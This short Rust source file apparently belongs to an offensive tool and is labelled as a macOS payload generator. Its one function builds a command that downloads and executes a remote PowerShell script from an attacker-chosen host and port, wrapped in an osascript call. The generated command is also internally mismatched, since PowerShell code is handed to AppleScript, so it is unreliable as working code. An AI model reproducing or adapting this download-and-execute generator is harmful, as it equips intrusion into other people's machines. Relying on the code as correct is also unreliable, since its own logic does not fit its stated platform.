// macOS APP bundle payload generator
use crate::cli::banner;

pub struct AppGenerator;

impl AppGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("MACOS-APP", &format!("{}:{}", lhost, lport));
        
        format!(
            "echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://{}:{}/payload.ps1\")' > payload.scpt && osascript payload.scpt",
            lhost, lport
        )
    }
}
